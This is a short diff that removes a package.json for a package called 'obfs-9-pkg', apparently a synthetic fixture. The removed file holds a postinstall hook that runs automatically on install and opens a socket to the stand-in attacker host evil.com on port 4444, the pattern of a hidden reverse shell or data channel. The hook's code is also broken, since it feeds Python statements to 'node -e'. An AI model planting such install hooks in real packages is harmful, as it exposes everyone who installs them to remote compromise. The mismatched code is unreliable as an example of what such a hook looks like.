@@ -1,7 +1,0 @@
-{
-  "name": "obfs-9-pkg",
-  "version": "1.0.0",
-  "scripts": {
-    "postinstall": "node -e \"import socket; s=socket.socket(); s.connect((\"evil.com\", 4444))\""
-  }
-}
